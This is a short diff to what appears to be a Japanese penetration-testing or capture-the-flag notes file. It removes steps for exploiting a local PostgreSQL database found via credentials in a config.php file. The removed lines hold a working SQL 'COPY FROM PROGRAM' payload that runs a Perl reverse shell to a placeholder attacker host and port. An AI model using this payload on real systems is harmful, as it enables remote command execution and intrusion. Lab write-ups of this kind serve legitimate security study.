@@ -1,13 +1,4 @@
 
-- 5432がローカルで動作しているため、postgresqlでアクセス
-- ~/backend/defaultsのconfig.phpがブラウザでアクセスすると解釈されて実行されるが中からみると認証情報ありけり
-- webappというdbに接続し、postgreユーザーとしてリバースシェルを獲得
-```sh
-CREATE TABLE cmd_exec(cmd_output text);
-COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<Port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
-```
-
-
 ---
 
 # Auto 
